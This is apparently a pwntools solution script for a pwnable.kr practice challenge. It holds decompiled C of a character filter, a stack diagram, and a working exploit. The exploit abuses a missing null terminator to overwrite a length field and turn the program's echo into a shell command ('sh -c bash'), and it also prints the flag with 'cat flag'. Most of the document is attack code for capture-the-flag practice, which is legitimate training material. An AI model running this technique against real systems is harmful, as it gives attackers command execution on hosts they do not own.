from pwn import *
'''
Line 14 of main()
fgets(s, 256, stdin);                // avoid overflow

unsigned int __cdecl protect(const char *input)
{
  size_t dest_len; // ebx
  size_t input_len; // eax
  size_t i; // [esp+1Ch] [ebp-12Ch]
  size_t j; // [esp+20h] [ebp-128h]
  char filter[4]; // [esp+25h] [ebp-123h]
  char dest; // [esp+3Ch] [ebp-10Ch]
  unsigned int canary; // [esp+13Ch] [ebp-Ch]

  canary = __readgsdword(0x14u);
  strcpy(filter, "#&;`'\"|*?~<>^()[]{}$\\,");
  for ( i = 0; i < strlen(input); ++i )
  {
    for ( j = 0; j < strlen(filter); ++j )
    {
      if ( input[i] == filter[j] )
      {
        strcpy(&dest, &input[i + 1]);
        *(_DWORD *)&input[i] = 0xA599E2;                          // 3-bytes heart symbol
        dest_len = strlen(&dest);
        input_len = strlen(input);
        memcpy((void *)&input[input_len], &dest, dest_len);       
        
        // memcpy will not copy \x00 at the end of a string. 
        // So if we have a filtered char in the string, the output will extend to the data till \x00 beacuse the original \x00 is missing.

      }
    }
  }
  return __readgsdword(0x14u) ^ canary;
}

+------------+
|    retn    |
+------------+
|            |  <- ebp
+------------+
|            |
+------------+
|   canary   |  <- ebp-8 (not affected)
+------------+
| buffer_len |  <- ebp-0xC
+------------+
| epilog_len |  <- ebp-0x10
+------------+
| prolog_len |  <- ebp-0x14                  \x01
+------------+  ---------------------
     ...                           |                          |<-3-bytes heart + 1-byte \x01->|
+------------+                    256 = command + MMMMM...M + 1-byte filtered character + \x01
|   buffer   |  <- ebp-0x114       |
+------------+  ---------------------
'''
p = remote("pwnable.kr", 9034)
prolog_length = "\x01"                        # only char 'e' could be copied into buffer

# Approach 1
payload = "nv sh -c bash "                  # nv bash -c bash               # if there are lots of params after -c, it will only take the first one.

payload += 'M'*(256 - len(payload) - len(prolog_length) - 2) + '|'          # 2 = '|' + len(prolog_length)
payload += prolog_length                                                    # hook the first char of 'echo', namely 'e'

# payload += 'M'*(256 - len(payload) - 2 - 1) + '|' + p32(0x1)              # Anthor way of constructing payload


# Approach 2
# payload = 'cat flag' + ' '*245 + '$'          # util ' ' cause the command should not be affected by other chars

# 8 + 245 + len(heart symbol) = 256, The payload will be like the following:
# cat flag             $\x00
# |<--------254------->|
# cat flag             \xA5\x99\xE2\x00
# |<------------256-------------->|
# strlen() only compute to $, so the memcpy to will consider \x00 as one of the components of the string.

log.info("Sending Payload: e{0}".format(payload))

p.sendline(payload)
# log.success(p.recv())         # Approach 2

p.interactive()                 # Approach 1